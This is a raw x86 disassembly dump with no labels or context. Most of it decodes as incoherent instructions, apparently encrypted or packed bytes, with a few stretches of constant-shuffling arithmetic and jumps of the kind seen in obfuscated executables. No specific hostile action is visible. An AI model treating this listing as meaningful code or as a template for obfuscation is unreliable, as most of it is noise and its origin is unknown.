  40e1b9:	fmul   QWORD PTR [esi]
  40e1bb:	popa   
  40e1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1bd:	adc    DWORD PTR [ebx],ecx
  40e1bf:	mov    bl,0x3b
  40e1c1:	mov    eax,ds:0xf203a9ef
  40e1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c7:	xchg   edi,eax
  40e1c8:	push   0xffffffe8
  40e1ca:	lock int 0xbb
  40e1cd:	lds    esi,FWORD PTR ds:0x9ae97dfe
  40e1d3:	add    BYTE PTR gs:[ebx+0x23],bh
  40e1d7:	xchg   esp,eax
  40e1d8:	out    dx,eax
  40e1d9:	mov    esp,0x669230bf
  40e1de:	pop    ebp
  40e1df:	imul   esi,DWORD PTR [ebx+0x5d],0xffffffaa
  40e1e3:	mov    bl,0x60
  40e1e5:	(bad)  
  40e1e6:	cli    
  40e1e7:	leave  
  40e1e8:	inc    ebx
  40e1e9:	sbb    al,0xf7
  40e1eb:	mov    al,0xc3
  40e1ed:	cld    
  40e1ee:	fcom   DWORD PTR [esi]
  40e1f0:	sar    BYTE PTR [edx-0x2de27b98],1
  40e1f6:	push   ds
  40e1f7:	and    edx,DWORD PTR [eax]
  40e1f9:	mov    ecx,edi
  40e1fb:	in     eax,dx
  40e1fc:	rol    BYTE PTR [edi+0x4c],1
  40e1ff:	nop
  40e200:	jp     0x40e1c4
  40e202:	inc    ebx
  40e203:	cmp    bh,BYTE PTR [edx+ecx*8-0x6c]
  40e207:	cmp    al,0xea
  40e209:	mov    ah,0xc0
  40e20b:	aas    
  40e20c:	fdiv   QWORD PTR [edi+eiz*1+0xa]
  40e210:	inc    esi
  40e211:	cmovs  eax,DWORD PTR [esi-0x63795b61]
  40e218:	mov    edi,0x727b9ca0
  40e21d:	dec    ecx
  40e21e:	arpl   WORD PTR [esi+0x40],di
  40e221:	pop    ss
  40e222:	mov    ebx,0xf78472da
  40e227:	dec    eax
  40e228:	add    eax,0xb64ce410
  40e22d:	cmp    BYTE PTR [ebx+0x7c],cl
  40e230:	dec    DWORD PTR [ebx-0x7]
  40e233:	into   
  40e234:	push   0xa08026a5
  40e239:	cs pop ds
  40e23b:	mov    bh,bl
  40e23d:	push   esp
  40e23e:	cmp    al,0x24
  40e240:	push   ss
  40e241:	rol    DWORD PTR [ebx+0x6a289a6b],0xcb
  40e248:	jae    0x40e25f
  40e24a:	pop    ds
  40e24b:	mov    bl,0x46
  40e24d:	pop    esi
  40e24e:	cmp    ah,BYTE PTR [edx]
  40e250:	shl    BYTE PTR [edi+0x3d],1
  40e253:	push   esp
  40e254:	jmp    0xfeb0:0xb66cdcac
  40e25b:	nop
  40e25c:	xor    eax,0x60ac8041
  40e261:	aam    0x3d
  40e263:	rcl    DWORD PTR [esi-0x3e546495],0x38
  40e26a:	pop    esi
  40e26b:	fld    DWORD PTR [ebp+0x21385395]
  40e271:	out    dx,eax
  40e272:	sub    esi,DWORD PTR [eax+edi*8-0x51]
  40e276:	xor    esi,DWORD PTR [edx-0x5803cdc2]
  40e27c:	jo     0x40e281
  40e27e:	and    edx,DWORD PTR [edi+0x54]
  40e281:	test   BYTE PTR [eax],ch
  40e283:	adc    al,0x8f
  40e285:	out    dx,al
  40e286:	sahf   
  40e287:	mov    esi,eax
  40e289:	jae    0x40e2bb
  40e28b:	cmc    
  40e28c:	pop    edx
  40e28d:	retf   
  40e28e:	sbb    al,0x4f
  40e290:	mov    edx,0x29759067
  40e295:	inc    eax
  40e296:	pop    edx
  40e297:	jecxz  0x40e28b
  40e299:	mov    edi,0xe92cdf58
  40e29e:	mov    al,ds:0xffc69692
  40e2a3:	cmp    ch,BYTE PTR [esi+0x7a]
  40e2a6:	xor    BYTE PTR [edi],0xea
  40e2a9:	sbb    esp,DWORD PTR [edi+0x1d899cf]
  40e2af:	fndisi(8087 only) 
  40e2b1:	adc    al,0x39
  40e2b3:	sub    BYTE PTR fs:[ebx+ebx*2-0x47679937],ah
  40e2bb:	je     0x40e283
  40e2bd:	mov    ds:0xeb9bd738,al
  40e2c2:	outs   dx,BYTE PTR ds:[esi]
  40e2c3:	je     0x40e326
  40e2c5:	mov    ebp,ebx
  40e2c7:	(bad)  
  40e2c8:	push   edi
  40e2c9:	mov    al,ds:0xe66f616b
  40e2ce:	mov    dh,0x88
  40e2d0:	sbb    ah,BYTE PTR [edx-0x48]
  40e2d3:	sub    BYTE PTR [eax+0x2a3588cb],0xbb
  40e2da:	and    dl,BYTE PTR [ecx]
  40e2dc:	test   BYTE PTR [esi],dl
  40e2de:	mov    bl,0x57
  40e2e0:	ficom  WORD PTR [edx+0x7]
  40e2e3:	mov    edx,DWORD PTR [ebx+esi*1]
  40e2e6:	push   es
  40e2e7:	stc    
  40e2e8:	xor    al,0x66
  40e2ea:	es ret 
  40e2ec:	inc    ebx
  40e2ed:	mov    bh,0xbc
  40e2ef:	pop    ds
  40e2f0:	aas    
  40e2f1:	push   edx
  40e2f2:	mov    esp,0x859cd15c
  40e2f7:	in     eax,dx
  40e2f8:	(bad)  
  40e2f9:	fnstenv [ebx-0x64fa70b]
  40e2ff:	jne    0x40e2ce
  40e301:	jbe    0x40e2eb
  40e303:	pop    ss
  40e304:	scas   al,BYTE PTR es:[edi]
  40e305:	and    al,0x60
  40e307:	ret    
  40e308:	xor    eax,0x81c2adb4
  40e30d:	fnstcw WORD PTR [ecx-0x298356db]
  40e313:	or     ebp,DWORD PTR [esi]
  40e315:	pop    esp
  40e316:	fisubr DWORD PTR [eax+0x7d]
  40e319:	push   ecx
  40e31a:	sbb    eax,0x88ee70eb
  40e31f:	inc    DWORD PTR [edx-0x72]
  40e322:	adc    edi,DWORD PTR [edx+eax*8+0x4ab6da77]
  40e329:	add    DWORD PTR [edi+0x57e3b485],ebx
  40e32f:	add    ecx,ebp
  40e331:	xchg   BYTE PTR [eax+0x5e3ca107],ah
  40e337:	mov    bh,0x54
  40e339:	frstor [ecx-0x145f4b11]
  40e33f:	mov    ch,0xae
  40e341:	ffree  st(1)
  40e343:	ds jns 0x40e377
  40e346:	push   ebx
  40e347:	jge    0x40e384
  40e349:	sub    dl,BYTE PTR [ecx-0x6ec3f4f1]
  40e34f:	dec    edi
  40e350:	push   edx
  40e351:	xor    eax,0x6b00b859
  40e356:	dec    ecx
  40e357:	and    BYTE PTR [edx],dl
  40e359:	(bad)  
  40e35a:	dec    esi
  40e35b:	and    bh,dl
  40e35d:	sub    esp,DWORD PTR [edx+0x60574ab9]
  40e363:	mov    ah,0x3e
  40e365:	xor    al,0x44
  40e367:	adc    eax,0x5026446c
  40e36c:	push   ecx
  40e36d:	in     al,dx
  40e36e:	dec    edi
  40e36f:	adc    al,0x5
  40e371:	add    esp,DWORD PTR [esi]
  40e373:	leave  
  40e374:	es (bad) 
  40e376:	mov    eax,0x436d53f2
  40e37b:	push   eax
  40e37c:	in     eax,0xb2
  40e37e:	ror    al,0x6c
  40e381:	ins    BYTE PTR es:[edi],dx
  40e382:	xlat   BYTE PTR ds:[ebx]
  40e383:	mov    cl,0xd8
  40e385:	cdq    
  40e386:	xor    DWORD PTR [ebp+0x75],0xffffff88
  40e38a:	jmp    DWORD PTR [ebx+ecx*8]
  40e38d:	push   ds
  40e38e:	jae    0x40e3f9
  40e390:	sub    ebp,DWORD PTR [edi-0x3a]
  40e393:	xor    al,0x57
  40e395:	aad    0x26
  40e397:	es in  eax,0x4a
  40e39a:	pop    ebx
  40e39b:	and    al,0xf2
  40e39d:	out    0x7c,eax
  40e39f:	and    bl,cl
  40e3a1:	cmp    DWORD PTR [ebp-0x5a],0xffffffae
  40e3a5:	out    0x9b,al
  40e3a7:	bound  edx,QWORD PTR [eax+0x72]
  40e3aa:	cmc    
  40e3ab:	mov    dl,0x31
  40e3ad:	pop    edx
  40e3ae:	outs   dx,DWORD PTR ds:[esi]
  40e3af:	adc    DWORD PTR [ecx-0x7f80b094],edx
  40e3b5:	push   ds
  40e3b6:	aas    
  40e3b7:	push   cs
  40e3b8:	cmc    
  40e3b9:	or     cl,0xf2
  40e3bc:	mov    al,ds:0x70df28fd
  40e3c1:	adc    BYTE PTR [edx+0x4f40d741],ch
  40e3c7:	fistp  DWORD PTR [edx]
  40e3c9:	call   0x1f8b:0x8dde4091
  40e3d0:	sbb    al,0x20
  40e3d2:	fcomp  QWORD PTR [edi]
  40e3d4:	mov    eax,DWORD PTR [ecx-0x603b058]
  40e3da:	or     ch,0x5f
  40e3dd:	loope  0x40e360
  40e3df:	dec    edx
  40e3e0:	xchg   BYTE PTR [ecx+edi*8],ch
  40e3e3:	sbb    dl,BYTE PTR [esi+0x1c]
  40e3e6:	mov    ds:0x5551e70,eax
  40e3eb:	jecxz  0x40e3c2
  40e3ed:	sahf   
  40e3ee:	inc    edx
  40e3ef:	push   ecx
  40e3f0:	mov    ah,0x6f
  40e3f2:	jae    0x40e3dd
  40e3f4:	test   eax,0x3c5cd6fb
  40e3f9:	(bad)  
  40e3fa:	and    DWORD PTR [edx+0x20cfa89f],ecx
  40e400:	jecxz  0x40e39c
  40e402:	sub    DWORD PTR [esi-0x6a],0xfffffff3
  40e406:	mov    al,0xfc
  40e408:	out    0x6e,eax
  40e40a:	adc    eax,0x1eccbd07
  40e40f:	sub    ah,dl
  40e411:	adc    eax,0x3267f0a6
  40e416:	fisubr DWORD PTR [ebx+0x58]
  40e419:	xchg   dl,bh
  40e41b:	add    dl,BYTE PTR [esi]
  40e41d:	push   0xffffffde
  40e41f:	add    al,0xb6
  40e421:	in     eax,0xac
  40e423:	cmp    bh,cl
  40e425:	ins    BYTE PTR es:[edi],dx
  40e426:	push   edi
  40e427:	mov    bl,0x43
  40e429:	mov    ebp,ebp
  40e42b:	mov    edi,0xeb7dde4e
  40e430:	xor    eax,0x3cad20a4
  40e435:	dec    ebp
  40e436:	jl     0x40e48e
  40e438:	or     BYTE PTR [ecx+0x106395ee],ch
  40e43e:	xchg   edx,eax
  40e43f:	in     al,0x39
  40e441:	mov    ds:0x8475bff5,eax
  40e446:	jb     0x40e494
  40e448:	push   es
  40e449:	xor    BYTE PTR [eax+0x3325d233],dh
  40e44f:	ins    DWORD PTR es:[edi],dx
  40e450:	add    BYTE PTR [eax],al
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax-0x4111c673],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [eax+0x54f8735b],dh
  40e4ef:	lods   eax,DWORD PTR ds:[esi]
  40e4f0:	adc    DWORD PTR [ebp+0x74f1c9ba],edx
  40e4f6:	mov    edi,0x7427dc82
  40e4fb:	jmp    0x40e523
  40e4fd:	jae    0x40e575
  40e4ff:	sti    
  40e500:	(bad)  
  40e501:	call   0x136a:0xc61ba951
  40e508:	shl    BYTE PTR [edx+0x30],1
  40e50b:	data16 fild WORD PTR [ebx-0x5f]
  40e50f:	adc    esp,DWORD PTR ds:0xe1ff7c5e
  40e515:	xchg   esp,eax
  40e516:	jae    0x40e4ae
  40e518:	outs   dx,BYTE PTR ds:[esi]
  40e519:	push   es
  40e51a:	ja     0x40e57d
  40e51c:	or     DWORD PTR [ebx-0x52ef319a],eax
  40e522:	jg     0x40e5a3
  40e524:	xchg   BYTE PTR [esi+0x7a],bl
  40e527:	sti    
  40e528:	jmp    0x8df603ce
  40e52d:	aas    
  40e52e:	stc    
  40e52f:	das    
  40e530:	dec    esp
  40e531:	sub    esp,ecx
  40e533:	imul   ebx,DWORD PTR [esi+ebx*1-0x150841ae],0x6
  40e53b:	mov    ecx,0x81230454
  40e540:	and    ebx,DWORD PTR [eax+0x59c0dfa0]
  40e546:	lods   eax,DWORD PTR ds:[esi]
  40e547:	shl    DWORD PTR [edi+0x47],1
  40e54a:	fst    DWORD PTR [ebp-0x25]
  40e54d:	into   
  40e54e:	mov    ds:0x11af0275,al
  40e553:	mov    cs,WORD PTR [ebx-0x1dfa3b53]
  40e559:	xchg   ebp,eax
  40e55a:	jne    0x40e59e
  40e55c:	dec    ebx
  40e55d:	push   esp
  40e55e:	xchg   DWORD PTR [eax],ecx
  40e560:	enter  0x4c03,0x25
  40e564:	ds dec edi
  40e566:	test   edx,edi
  40e568:	nop
  40e569:	aaa    
  40e56a:	xchg   esp,eax
  40e56b:	js     0x40e5b8
  40e56d:	dec    edx
  40e56e:	aas    
  40e56f:	jmp    0x9820:0x1d26aa49
  40e576:	jbe    0x40e572
  40e578:	test   esp,0x2478f1fe
  40e57e:	jmp    0xde5ec41b
  40e583:	scas   eax,DWORD PTR es:[edi]
  40e584:	jmp    0x9509:0x744ad3af
  40e58b:	inc    edi
  40e58c:	fs mov al,0x10
  40e58f:	mov    ds:0x8456c101,eax
  40e594:	into   
  40e595:	jecxz  0x40e55e
  40e597:	mov    ?,WORD PTR [edi+edx*2-0x15]
  40e59b:	aas    
  40e59c:	cmc    
  40e59d:	and    eax,0x72b2a44c
  40e5a2:	jp     0x40e561
  40e5a4:	je     0x40e623
  40e5a6:	xor    cl,BYTE PTR [esp+ecx*1]
  40e5a9:	xchg   ebp,ebp
  40e5ab:	jp     0x40e563
  40e5ad:	dec    esi
  40e5ae:	loopne 0x40e557
  40e5b0:	dec    ebp
  40e5b1:	lock mov WORD PTR [bx+si],?
  40e5b5:	lods   al,BYTE PTR ds:[esi]
  40e5b6:	adc    al,0x84
  40e5b8:	in     al,0x32
  40e5ba:	test   BYTE PTR [ecx-0x47],dl
  40e5bd:	xchg   edx,eax
  40e5be:	dec    eax
  40e5bf:	dec    edx
  40e5c0:	nop
  40e5c1:	inc    ecx
  40e5c2:	sub    DWORD PTR [esi],ecx
  40e5c4:	fst    QWORD PTR [eax]
  40e5c6:	inc    ecx
  40e5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c8:	pop    edi
  40e5c9:	jno    0x40e5af
  40e5cb:	jo     0x40e625
  40e5cd:	loopne 0x40e5d5
  40e5cf:	mov    eax,0x3ea85597
  40e5d4:	mov    ecx,0xa2fdbc2a
  40e5d9:	inc    eax
  40e5da:	out    0x77,eax
  40e5dc:	sbb    DWORD PTR [edx+0x73],esi
  40e5df:	mov    ecx,0xbb59aae4
  40e5e4:	push   esi
  40e5e5:	adc    bh,BYTE PTR [ebp+0x3453a194]
  40e5eb:	not    DWORD PTR [ecx+0x57]
  40e5ee:	sub    ch,0x6d
  40e5f1:	jno    0x40e598
  40e5f3:	pop    es
  40e5f4:	pop    esp
  40e5f5:	or     edi,DWORD PTR [ecx+0x1a]
  40e5f8:	aad    0xcb
  40e5fa:	aas    
  40e5fb:	das    
  40e5fc:	jp     0x40e612
  40e5fe:	dec    ebp
  40e5ff:	inc    eax
  40e600:	retf   
  40e601:	fild   DWORD PTR [ebp-0x6d]
  40e604:	fs out 0xad,al
  40e607:	mov    ds:0x20eef3ff,eax
  40e60c:	cmp    DWORD PTR [ecx],esi
  40e60e:	cwde   
  40e60f:	popf   
  40e610:	xor    bh,BYTE PTR [esp+ecx*8-0x5d27c46e]
  40e617:	xor    DWORD PTR [edx],ebx
  40e619:	inc    eax
  40e61a:	rol    BYTE PTR [edi+0x63db832f],0x1c
  40e621:	jmp    0x40e62c
  40e623:	add    DWORD PTR [ebx+0x66],eax
  40e626:	fistp  DWORD PTR [esi]
  40e628:	out    0x4b,al
  40e62a:	cmp    al,0x6b
  40e62c:	cmp    BYTE PTR [ecx-0x24],ah
  40e62f:	xor    al,0x84
  40e631:	ds add eax,0xed692a8a
  40e637:	or     al,0x5c
  40e639:	or     ebx,eax
  40e63b:	fadd   st(3),st
  40e63d:	(bad)  
  40e63f:	mov    ds:0x27e716c5,al
  40e644:	pushf  
  40e645:	jbe    0x40e5da
  40e647:	push   edi
  40e648:	out    dx,al
  40e649:	adc    BYTE PTR [edx-0x4c],0xd0
  40e64d:	sub    edx,DWORD PTR [esi+0x1c1d311d]
  40e653:	popa   
  40e654:	aaa    
  40e655:	or     al,0xb8
  40e657:	xchg   ebx,eax
  40e658:	rcl    BYTE PTR ds:0x160d099b,cl
  40e65e:	jge    0x40e5fd
  40e660:	mov    ebx,DWORD PTR [esi+0x1a]
  40e663:	sbb    DWORD PTR ds:0x88f980bf,0xffffffe4
  40e66a:	dec    ecx
  40e66b:	cmp    ah,BYTE PTR [eax]
  40e66d:	sub    ch,BYTE PTR [edi+0x4094fe14]
  40e673:	sbb    ecx,ecx
  40e675:	jl     0x40e668
  40e677:	dec    ebp
  40e678:	sub    eax,0x960d621a
  40e67d:	jb     0x40e611
  40e67f:	cwde   
  40e680:	xlat   BYTE PTR ds:[ebx]
  40e681:	jb     0x40e638
  40e683:	(bad)  
  40e684:	sbb    al,0xbd
  40e686:	sub    dl,BYTE PTR [esi+esi*4+0x27]
  40e68a:	xor    eax,0x211f1031
  40e68f:	mov    edx,0x1e8f3cec
  40e694:	jle    0x40e703
  40e696:	lds    esi,FWORD PTR [ecx-0x60]
  40e699:	sbb    ebx,DWORD PTR [esp+esi*4]
  40e69c:	xchg   ebp,eax
  40e69d:	and    eax,0x3247d901
  40e6a2:	cmp    al,dh
  40e6a4:	xor    BYTE PTR [esi+0x13],ch
  40e6a7:	std    
  40e6a8:	push   ecx
  40e6a9:	cmp    al,0x39
  40e6ab:	xchg   ebp,eax
  40e6ac:	addr16 mov cl,0x16
  40e6af:	sbb    eax,0xd2818b9
  40e6b4:	jg     0x40e689
  40e6b6:	out    0x4c,eax
  40e6b8:	push   cs
  40e6b9:	jl     0x40e71f
  40e6bb:	arpl   WORD PTR [bp+di],sp
  40e6be:	and    esi,DWORD PTR [edx]
  40e6c0:	lahf   
  40e6c1:	aad    0x81
  40e6c3:	pop    es
  40e6c4:	xchg   cl,ah
  40e6c6:	jbe    0x40e733
  40e6c8:	outs   dx,BYTE PTR ds:[esi]
  40e6c9:	jnp    0x40e73b
  40e6cb:	push   edi
  40e6cc:	call   0x96688144
  40e6d1:	fidivr DWORD PTR [ecx]
  40e6d3:	(bad)  
  40e6d4:	mov    edx,0x4e740fa9
  40e6d9:	xor    edi,DWORD PTR [ebx]
  40e6db:	test   eax,0xaee0b0aa
  40e6e0:	mov    al,BYTE PTR [ecx+0x5d7df5f4]
  40e6e6:	jns    0x40e702
  40e6e8:	ficom  DWORD PTR [esi-0x12]
  40e6eb:	bound  edx,QWORD PTR [ecx-0x718b981]
  40e6f1:	jo     0x68a2c988
  40e6f7:	jnp    0x40e6fd
  40e6f9:	(bad)  
  40e6fa:	cmp    edx,DWORD PTR [eax-0x67]
  40e6fd:	mov    ecx,0x7fa5ad3d
  40e702:	jecxz  0x40e73e
  40e704:	pop    esp
  40e705:	iret   
  40e706:	dec    eax
  40e707:	lahf   
  40e708:	in     al,dx
  40e709:	das    
  40e70a:	mov    WORD PTR [bp+di-0x1e],es
  40e70e:	inc    edi
  40e70f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e711:	test   dh,al
  40e713:	mov    DWORD PTR [esi+esi*2-0x5ed33f0a],ecx
  40e71a:	sbb    eax,0x456e0497
  40e71f:	daa    
  40e720:	ins    DWORD PTR es:[edi],dx
  40e721:	mov    ecx,0xfdb133b2
  40e726:	sbb    al,0x74
  40e728:	jb     0x40e6aa
  40e72a:	add    al,0x55
  40e72c:	lds    ebx,FWORD PTR [ebx+0x53]
  40e72f:	mov    dh,0x37
  40e731:	mov    al,0x2
  40e733:	fnstcw WORD PTR [edi-0x13]
  40e736:	dec    ebx
  40e737:	cmp    DWORD PTR [ecx-0x7d],ecx
  40e73a:	sbb    al,0x61
  40e73c:	lods   al,BYTE PTR ds:[esi]
  40e73d:	jnp    0x40e75c
  40e73f:	jl     0x40e712
  40e741:	fsub   QWORD PTR [ecx]
  40e743:	add    ebp,eax
  40e745:	into   
  40e746:	xlat   BYTE PTR ds:[ebx]
  40e747:	jnp    0x40e7ab
  40e749:	or     dl,BYTE PTR ds:0xb8ea7223
  40e74f:	pushf  
  40e750:	(bad)  
  40e751:	ret    0x64c2
  40e754:	test   DWORD PTR [esi-0x61153f75],eax
  40e75a:	and    eax,0x7199a817
  40e75f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e760:	ins    BYTE PTR es:[edi],dx
  40e761:	imul   ebx,DWORD PTR [ebp+0x74],0xa563e47
  40e768:	repz cwde 
  40e76a:	scas   eax,DWORD PTR es:[edi]
  40e76b:	or     al,0x4a
  40e76d:	nop
  40e76e:	dec    ebx
  40e76f:	add    DWORD PTR [esi+0x21],ebp
  40e772:	or     DWORD PTR [edi],0x66
  40e775:	cwde   
  40e776:	div    DWORD PTR [esi-0x72]
  40e779:	scas   eax,DWORD PTR es:[edi]
  40e77a:	int    0x9f
  40e77c:	mov    ch,0xb8
  40e77e:	into   
  40e77f:	add    BYTE PTR [esi-0x4403d5fb],dh
  40e785:	push   esp
  40e786:	and    DWORD PTR [edi-0x41a68517],edx
  40e78c:	mov    edx,0xb83a95fc
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	mov    dl,0x59
  40e7f1:	pop    ebx
  40e7f2:	jo     0x40e836
  40e7f4:	mov    esi,0x14d21818
  40e7f9:	sbb    BYTE PTR [eax],bl
  40e7fb:	push   edi
  40e7fc:	loope  0x40e821
  40e7fe:	cs popf 
  40e800:	loopne 0x40e797
  40e802:	jmp    0x3a2f:0xf64a6bc6
  40e809:	xchg   edi,eax
  40e80a:	shl    BYTE PTR [ecx-0x24],1
  40e80d:	cld    
  40e80e:	jae    0x40e7e5
  40e810:	jg     0x40e81a
  40e812:	out    0xa4,al
  40e814:	out    0xad,eax
  40e816:	cwde   
  40e817:	push   edx
  40e818:	daa    
  40e819:	es cli 
  40e81b:	xor    BYTE PTR [edx+0x5f],0x66
  40e81f:	add    cl,BYTE PTR [edx]
  40e821:	mov    edx,0xf004164f
  40e826:	rcr    WORD PTR [ecx+0xa],cl
  40e82a:	mov    es,WORD PTR [edi+0x4250bb52]
  40e830:	(bad)  [esi]
  40e832:	sti    
  40e833:	rol    BYTE PTR [ecx+0x7a],cl
  40e836:	fwait
  40e837:	mov    cs,WORD PTR [edi+edi*1+0x35]
  40e83b:	rcl    edi,0xb7
  40e83e:	mov    eax,ds:0xd5821fd1
  40e843:	jecxz  0x40e814
  40e845:	mov    bl,0x7c
  40e847:	cmp    al,0x5d
  40e849:	jl     0x40e83b
  40e84b:	and    eax,0x1b41a33b
  40e850:	jmp    FWORD PTR [edx]
  40e852:	add    BYTE PTR [esi+0x1f880775],cl
  40e858:	hlt    
  40e859:	test   eax,0x8faa1c75
  40e85e:	outs   dx,BYTE PTR ds:[esi]
  40e85f:	xor    DWORD PTR [edx-0x5ffff437],0xffffffa7
  40e866:	xor    BYTE PTR [ebx+eax*8+0x46e7c781],ah
  40e86d:	ss hlt 
  40e86f:	addr16 in eax,0x33
  40e872:	xor    esi,DWORD PTR [ebp+ebp*2+0x1a77e954]
  40e879:	dec    ebp
  40e87a:	mov    esp,0x836bfaf0
  40e87f:	sub    al,dl
  40e881:	and    ebp,DWORD PTR [edi]
  40e883:	jno    0x40e83d
  40e885:	loope  0x40e82c
  40e887:	and    DWORD PTR [esi-0x28],0xffffffa6
  40e88b:	mov    BYTE PTR [edi+0x47],cl
  40e88e:	xor    DWORD PTR [ebp+0xa],eax
  40e891:	hlt    
  40e892:	lock and DWORD PTR [edx-0x80],ebp
  40e896:	cld    
  40e897:	pop    esp
  40e898:	inc    BYTE PTR [ebx+0x7553e62f]
  40e89e:	add    ebp,DWORD PTR [ebp+ebx*4-0x28a2619b]
  40e8a5:	retf   0xcc44
  40e8a8:	push   0xffffff93
  40e8aa:	push   esi
  40e8ab:	je     0x40e8b5
  40e8ad:	rcl    BYTE PTR [edi-0x2c],cl
  40e8b0:	jns    0x40e868
  40e8b2:	test   BYTE PTR [edx+0x69],ah
  40e8b5:	ins    BYTE PTR es:[edi],dx
  40e8b6:	adc    al,0xa6
  40e8b8:	jo     0x40e85d
  40e8ba:	imul   esi,DWORD PTR [ebx],0xffffffd3
  40e8bd:	push   DWORD PTR [esi-0x318c927]
  40e8c3:	inc    esp
  40e8c4:	xor    esi,edx
  40e8c6:	mov    ch,BYTE PTR [edx+0x740b221f]
  40e8cc:	bound  ebx,QWORD PTR [eax+esi*4+0x10]
  40e8d0:	cmp    bl,ah
  40e8d2:	pop    edi
  40e8d3:	std    
  40e8d4:	sahf   
  40e8d5:	scas   eax,DWORD PTR es:[edi]
  40e8d6:	xchg   ebp,eax
  40e8d7:	inc    edx
  40e8d8:	outs   dx,BYTE PTR ds:[esi]
  40e8d9:	sbb    al,0xc3
  40e8db:	test   bl,bl
  40e8dd:	dec    ecx
  40e8de:	call   0x1e6a:0x4e09690e
  40e8e5:	ja     0x40e945
  40e8e7:	mul    DWORD PTR [edi-0xc0a046f]
  40e8ed:	xlat   BYTE PTR ds:[ebx]
  40e8ee:	or     dl,ch
  40e8f0:	sbb    edi,DWORD PTR ds:0xfe123869
  40e8f6:	jge    0x40e8c2
  40e8f8:	pop    esp
  40e8f9:	jg     0x40e957
  40e8fb:	adc    DWORD PTR [ecx],0xe4348728
  40e901:	fs (bad) 
  40e903:	call   0xbfcaba5b
  40e908:	and    BYTE PTR [edi-0x35cf8b73],ah
  40e90e:	add    eax,0x174e180f
  40e913:	sbb    ecx,DWORD PTR [ebx]
  40e915:	add    al,BYTE PTR [edi+0x63]
  40e918:	pop    ebx
  40e919:	cdq    
  40e91a:	mov    ebp,0xba761ba1
  40e91f:	dec    eax
  40e920:	jno    0x40e93a
  40e922:	enter  0x29f6,0xc3
  40e926:	or     al,0xfa
  40e928:	pop    edx
  40e929:	in     al,0x3c
  40e92b:	mov    ?,WORD PTR ds:0xa3b35272
  40e931:	mov    dl,0x50
  40e933:	outs   dx,BYTE PTR ds:[esi]
  40e934:	jbe    0x40e98f
  40e936:	ins    BYTE PTR es:[di],dx
  40e938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e939:	rol    ch,cl
  40e93b:	ja     0x40e9ad
  40e93d:	stc    
  40e93e:	pop    eax
  40e93f:	lea    ebx,[edx-0x41]
  40e942:	out    dx,eax
  40e943:	mov    bh,0x7b
  40e945:	(bad)  
  40e946:	sub    eax,DWORD PTR [edi]
  40e948:	jb     0x40e965
  40e94a:	pop    eax
  40e94b:	xlat   BYTE PTR ds:[ebx]
  40e94c:	fcmovbe st,st(4)
  40e94e:	fidiv  WORD PTR [edx]
  40e950:	jmp    0xc802a1c2
  40e955:	pop    ebx
  40e956:	mov    edx,0x9ab79fb3
  40e95b:	dec    esp
  40e95c:	arpl   sp,cx
  40e95e:	pop    edx
  40e95f:	jl     0x40e974
  40e961:	inc    esi
  40e962:	or     al,0x9
  40e964:	or     eax,DWORD PTR [edx+eax*4]
  40e967:	cli    
  40e968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e969:	jecxz  0x40e9d9
  40e96b:	jg     0x40e9d7
  40e96d:	test   al,0x3d
  40e96f:	stos   DWORD PTR es:[edi],eax
  40e970:	xchg   BYTE PTR [esi+0x12c18c5f],ah
  40e976:	(bad)  
